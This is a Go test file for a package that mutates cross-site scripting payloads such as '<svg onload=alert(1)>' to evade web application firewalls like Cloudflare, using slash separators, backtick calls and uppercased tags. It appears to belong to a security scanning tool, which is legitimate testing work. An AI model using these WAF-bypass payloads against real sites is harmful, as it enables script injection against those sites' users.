package xssencode

import (
	"strings"
	"testing"
)

func TestMutateForWAF_UnknownReturnsNil(t *testing.T) {
	if MutateForWAF("", "<svg onload=alert(1)>") != nil {
		t.Fatal("empty wafType must return nil (no wasted requests)")
	}
}

func TestMutateForWAF_SlashAndBacktick(t *testing.T) {
	payload := "<svg onload=alert(1)>"
	got := MutateForWAF("cloudflare", payload)
	if len(got) == 0 {
		t.Fatal("expected mutations for cloudflare")
	}

	var haveSlash, haveBacktick bool
	for _, v := range got {
		if v.Value == payload {
			t.Fatalf("mutation must not equal the original payload: %q", v.Value)
		}
		if strings.Contains(v.Value, "<svg/onload=") {
			haveSlash = true
		}
		if strings.Contains(v.Value, "alert`1`") {
			haveBacktick = true
		}
	}
	if !haveSlash {
		t.Errorf("expected a slash-separator variant: %+v", got)
	}
	if !haveBacktick {
		t.Errorf("expected a backtick-parens variant: %+v", got)
	}
}

func TestUpperTagNames_PreservesAttributesAndJS(t *testing.T) {
	got := upperTagNames("<svg onload=alert(1)>")
	if !strings.HasPrefix(got, "<SVG") {
		t.Fatalf("tag name not uppercased: %q", got)
	}
	if !strings.Contains(got, "alert(1)") {
		t.Fatalf("JS body must be untouched: %q", got)
	}
	if !strings.Contains(got, "onload=") {
		t.Fatalf("attribute must be untouched: %q", got)
	}
}

func TestBacktickParens_OnlySimpleArgs(t *testing.T) {
	if got := backtickParens("alert(1)"); got != "alert`1`" {
		t.Fatalf("simple arg: %q", got)
	}
	// Nested parentheses are left alone (backtick template would not execute).
	if got := backtickParens("alert(foo(1))"); got == "alert`foo(1)`" {
		t.Fatalf("nested call should not be naively backticked: %q", got)
	}
}

func TestMutateForWAF_GenericProducesSet(t *testing.T) {
	if got := MutateForWAF("generic", "<svg onload=alert(1)>"); len(got) == 0 {
		t.Fatal("generic WAF should still yield mutations")
	}
}
